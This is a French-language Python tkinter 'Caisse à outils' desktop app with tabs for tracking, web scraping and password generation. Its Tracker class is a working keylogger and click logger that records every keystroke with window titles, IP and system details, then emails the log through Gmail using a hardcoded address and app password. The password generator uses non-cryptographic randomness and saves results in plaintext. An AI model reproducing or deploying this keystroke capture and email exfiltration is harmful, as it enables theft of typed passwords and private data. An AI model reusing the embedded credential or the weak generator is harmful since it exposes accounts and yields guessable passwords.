import tkinter as tk
from tkinter import ttk, messagebox
from tkinter import filedialog
from tkinter import ttk, IntVar, Checkbutton
from tkinter import messagebox
import pygetwindow as gw
import ctypes
from ctypes import wintypes
import subprocess
import pynput
from pynput import mouse
from pynput import keyboard
from pynput.keyboard import Key, Listener
import datetime
from datetime import datetime
import email.message
from email.message import EmailMessage
import bs4
from bs4 import BeautifulSoup
import requests
import os
import shutil
import platform
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import getpass
import socket
import string
import random

#----------------------------------------------------------------------------------------------------------------------------#
#-------------------------------------------------Message d'Information------------------------------------------------------#
#----------------------------------------------------------------------------------------------------------------------------#

def inform_user_about_permissions():
    messagebox.showinfo("Autorisation Requise",
                        "Cette application nécessite l'autorisation d'exécuter des AppleScript pour fonctionner correctement.\n\n"
                        "Veuillez accorder l'autorisation dans les Préférences Système > Sécurité et Confidentialité > Confidentialité > Automatisation.\n\n"
                        "Assurez-vous que votre terminal ou IDE est autorisé à contrôler votre ordinateur.")
    
# Vérifie si le script est exécuté sur macOS
if platform.system() == 'Darwin':
    inform_user_about_permissions()
    
#----------------------------------------------------------------------------------------------------------------------------#
#-------------------------------------------------------TRACKER--------------------------------------------------------------#
#----------------------------------------------------------------------------------------------------------------------------#

# Utilitaire pour obtenir le titre de la fenêtre active
def get_active_window_title():
    os_name = platform.system()
    if os_name == 'Windows':
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value
    elif os_name == 'Darwin':  # macOS
        script = 'tell application "System Events" to get name of first application process whose frontmost is true'
        try:
            title = subprocess.check_output(["osascript", "-e", script]).decode("utf-8").strip()
            return title
        except subprocess.CalledProcessError:
            return "Unknown Window"
    else:
        return "Unsupported OS"

class Tracker:
    def __init__(self):
        self.mouse_listener = mouse.Listener(on_click=self.on_click)
        self.keyboard_listener = keyboard.Listener(on_press=self.on_press)
        self.running = False
        self.start_time = None
        self.end_time = None
        self.tracking_folder = "tracking_files"
        os.makedirs(self.tracking_folder, exist_ok=True)

    def on_click(self, x, y, button, pressed):
        if pressed:
            window_title = get_active_window_title()
            with open(os.path.join(self.tracking_folder, self.tracking_file_name), 'a', encoding='utf-8') as f:
                f.write(f'Mouse clicked at ({x}, {y}) on window "{window_title}" at {datetime.now()}\n')

    def on_press(self, key):
        window_title = get_active_window_title()
        key_str = str(key).replace("'", "")
        if hasattr(key, 'char'):
            key_str = key.char if key.char else key_str
        with open(os.path.join(self.tracking_folder, self.tracking_file_name), 'a', encoding='utf-8') as f:
            f.write(f'Key pressed: {key_str} in window "{window_title}" at {datetime.now()}\n')

    def start_tracking(self):
        if not self.running:
            # Obtenez l'adresse IP locale
            local_ip = socket.gethostbyname(socket.gethostname())
            # Obtenez les informations système
            os_info = platform.system() + " " + platform.release()
            processor_info = platform.processor()
            # Obtenez la date et l'heure actuelles
            now = datetime.now()
            date_time_str = now.strftime("%Y-%m-%d %H:%M:%S")
            # Utilisez des tirets au lieu de deux points pour la compatibilité des noms de fichiers sous Windows
            date_time_str = now.strftime("%Y-%m-%d_%H-%M-%S")

            # Création du dossier s'il n'existe pas
            if not os.path.exists(self.tracking_folder):
                os.makedirs(self.tracking_folder)

            # Nom du fichier incluant la date et l'heure
            self.tracking_file_name = f"tracking_{date_time_str}.txt"
            tracking_file_path = os.path.join(self.tracking_folder, self.tracking_file_name)

            # Écrivez ces informations dans le fichier au début du tracking
            with open(os.path.join(self.tracking_folder, self.tracking_file_name), 'w', encoding='utf-8') as f:
                f.write(f"Adresse IP de départ: {local_ip}\n")
                f.write(f"Système d'exploitation: {os_info}\n")
                f.write(f"Processeur: {processor_info}\n")
                f.write(f"Date et heure de départ: {date_time_str}\n\n")

            self.tracking_file_name = f"tracking_{date_time_str}.txt"
            self.start_time = now
            self.running = True
            self.mouse_listener.start()
            self.keyboard_listener.start()

    def stop_tracking(self):
        if self.running:
            self.end_time = datetime.now()
            self.running = False
            self.mouse_listener.stop()
            self.keyboard_listener.stop()
            self.copy_and_delete_tracking_file()

    def copy_and_delete_tracking_file(self):
        if self.start_time and self.end_time:
            start_str = self.start_time.strftime("%Y-%m-%d_%H-%M-%S")
            end_str = self.end_time.strftime("%Y-%m-%d_%H-%M-%S")
            archived_filename = f"archive_tracking_{start_str}_to_{end_str}.txt"
            archived_file_path = os.path.join(self.tracking_folder, archived_filename)
            
            shutil.move(os.path.join(self.tracking_folder, self.tracking_file_name), archived_file_path)
            
            self.tracking_file_path = archived_file_path
            messagebox.showinfo("Tracking Terminé", f"Tracking sauvegardé et archivé sous {archived_filename}")

    # Fonctionnalité d'envoi par email
    def send_email(self):
        sender_email = "theamazingjocker@gmail.com"
        receiver_email = "theamazingjocker@gmail.com"
        password = "mypnnftjjsinshhr"  # Mot de passe d'application sans espaces
        
        # Lire le contenu du fichier de tracking
        file_path = self.tracking_file_path
        with open(file_path, 'r', encoding='utf-8') as file:
            tracking_data = file.read()
        
        # Préparer le corps de l'email avec le contenu du fichier
        body = "Voici le contenu du fichier de tracking :\n\n" + tracking_data

        msg = EmailMessage()
        msg.set_content(body)
        msg['Subject'] = 'Document de Tracking'
        msg['From'] = sender_email
        msg['To'] = receiver_email

        try:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                smtp.login(sender_email, password)
                smtp.send_message(msg)
            messagebox.showinfo('Succès', 'Email envoyé avec succès !')
        except Exception as e:
            messagebox.showerror('Erreur', f'Erreur lors de l\'envoi de l\'email : {e}')

def on_click(self, x, y, button, pressed):
    if pressed:
        window_title = self.get_active_window_title()
        with open('tracking.txt', 'a', encoding='utf-8') as f:
            f.write(f'Mouse clicked at ({x}, {y}) on window "{window_title}" at {datetime.now()}\n')

def on_press(self, key):
    window_title = self.get_active_window_title()
    try:
        # Gérer les caractères spéciaux et les lettres/chiffres
        if hasattr(key, 'char') and key.char:
            key_str = key.char  # Caractère pressé (peut être None pour certaines touches spéciales)
        elif key == Key.space:
            key_str = ' '  # Espace
        elif key == Key.enter:
            key_str = '\n'  # Nouvelle ligne pour Enter
        elif key == Key.tab:
            key_str = '\t'  # Tabulation
        else:
            # Pour les autres touches spéciales, utilisez le nom de la touche entre crochets
            key_str = f'[{key.name}]'

        # Écrire dans le fichier
        with open('tracking.txt', 'a', encoding='utf-8') as f:
            f.write(f'Key pressed: {key_str} in window "{window_title}" at {datetime.now()}\n')
    except Exception as e:
        print(f"Error logging key press: {e}")

def toggle_tracking():
    global tracker
    if tracker.running:
        tracker.stop_tracking()
        button.config(text='Start Tracking')
    else:
        tracker.start_tracking()
        button.config(text='Stop Tracking')

# Fonction pour obtenir l'adresse IP locale
def get_local_ip():
    try:
        # Crée un socket pour se connecter à un site web public
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Google DNS
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        return "IP inconnue"

# Obtenez la date et l'heure actuelles
now = datetime.now()
date_time_str = now.strftime("%Y-%m-%d %H:%M:%S")

#----------------------------------------------------------------------------------------------------------------------------#
#---------------------------------------------------------SCRAPING-----------------------------------------------------------#
#----------------------------------------------------------------------------------------------------------------------------#

def scrape_and_save():
    url = url_entry.get()
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')
        elements = soup.find_all(['h1', 'h2', 'h3', 'p', 'ul', 'ol'])
        filename = url.replace('http://', '').replace('https://', '').replace('/', '_') + '.txt'
        with open(filename, 'w') as file:
            for element in elements:
                file.write(f"{element}\n\n")
        messagebox.showinfo("Succès", f"Les données ont été enregistrées dans {filename}")
    except Exception as e:
        messagebox.showerror("Erreur", f"Échec du scraping : {e}")

#----------------------------------------------------------------------------------------------------------------------------#
#----------------------------------------------Générateur de Mot de Passe----------------------------------------------------#
#----------------------------------------------------------------------------------------------------------------------------#
        
# Fonction pour générer le mot de passe
def generate_password():
    length = int(entry_length.get())
    include_uppercase = var_uppercase.get()
    include_specials = var_specials.get()
    include_digits = var_digits.get()
    
    characters = string.ascii_lowercase
    if include_uppercase:
        characters += string.ascii_uppercase
    if include_specials:
        characters += string.punctuation
    if include_digits:
        characters += string.digits
    
    password = ''.join(random.choice(characters) for _ in range(length))
    label_result.config(text=password)
    
    # Enregistrer le mot de passe dans un fichier
    with open('mot_de_passe_genere.txt', 'w') as file:
        file.write(password)

#----------------------------------------------------------------------------------------------------------------------------#
#-------------------------------------------------------INTERFACE------------------------------------------------------------#
#----------------------------------------------------------------------------------------------------------------------------#

root = tk.Tk()
root.title("Caisse à outils")

tab_control = ttk.Notebook(root)

### Tracking ###
tab1 = ttk.Frame(tab_control)
tab_control.add(tab1, text='Tracking')
tracker = Tracker()
button = tk.Button(tab1, text='Start Tracking', command=toggle_tracking)
button.pack()
send_email_button = tk.Button(tab1, text='Envoyer le Tracking par Email', command=lambda: tracker.send_email())
send_email_button.pack()

### Web Scraping ###
tab2 = ttk.Frame(tab_control)
tab_control.add(tab2, text='Web Scraping')
url_label = tk.Label(tab2, text="Entrez l'URL :")
url_label.pack(pady=5)
url_entry = tk.Entry(tab2, width=50)
url_entry.pack(pady=5)
scrape_button = tk.Button(tab2, text="Scrape et Sauvegarde", command=scrape_and_save)
scrape_button.pack(pady=10)

### Générateur de Mot de Passe ###
tab3 = ttk.Frame(tab_control)
tab_control.add(tab3, text='Générateur de Mot de Passe')
tk.Label(tab3, text="Générateur de Mot de Passe", font=("Arial", 14)).pack(pady=10)
tk.Label(tab3, text="Longueur du mot de passe:").pack(pady=5)
entry_length = tk.Entry(tab3)
entry_length.pack(pady=5)
entry_length.insert(0, "12")  # Valeur par défaut
var_uppercase = IntVar(value=1)
Checkbutton(tab3, text="Inclure des majuscules", variable=var_uppercase).pack(pady=5)
var_digits = IntVar(value=1)
Checkbutton(tab3, text="Inclure des chiffres", variable=var_digits).pack(pady=5)
var_specials = IntVar(value=1)
Checkbutton(tab3, text="Inclure des caractères spéciaux", variable=var_specials).pack(pady=5)
tk.Button(tab3, text="Générer mot de passe", command=generate_password).pack(pady=10)
label_result = tk.Label(tab3, text="Votre mot de passe s'affichera ici")
label_result.pack(pady=10)

tab_control.pack(expand=1, fill='both')

#----------------------------------------------------------------------------------------------------------------------------#
#-------------------------------------------------------DéMARRAGE------------------------------------------------------------#
#----------------------------------------------------------------------------------------------------------------------------#

# Vérifie si le script est exécuté sur macOS
if platform.system() == 'Darwin':
    inform_user_about_permissions()

root.mainloop()